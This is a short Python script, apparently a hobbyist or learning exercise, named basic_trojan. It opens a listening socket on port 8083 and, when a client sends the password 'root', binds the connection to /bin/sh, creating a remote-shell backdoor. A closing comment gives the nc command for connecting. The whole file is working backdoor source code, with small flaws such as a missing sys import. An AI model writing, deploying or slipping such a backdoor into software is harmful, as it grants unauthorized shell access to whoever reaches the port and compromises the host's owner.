#!/usr/bin/env python
#--*-- coding:UTF-8 --*--

import socket, os, code

def basic_trojan():
    host = ''
    port = 8083
    mot=""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    client, adresse = s.accept()
    print(adresse)
    print(client.getpeername())
    client.send(b"Hello world!\n")
    mot=client.recv(1024)
    print(mot)
    while 1:
        if mot==b"root\n" :
            print("on est dans root")
            for f in range(3):
                os.dup2(client.fileno(), f)
            os.execl("/bin/sh", "/bin/sh")
            code.interact()
            sys.exit
        else:
            print("out")
            break
    client.close()
    s.close()

if __name__=="__main__" :
    basic_trojan()
#start a client with following command
#nc -vv 127.0.0.1 8083
#pasword root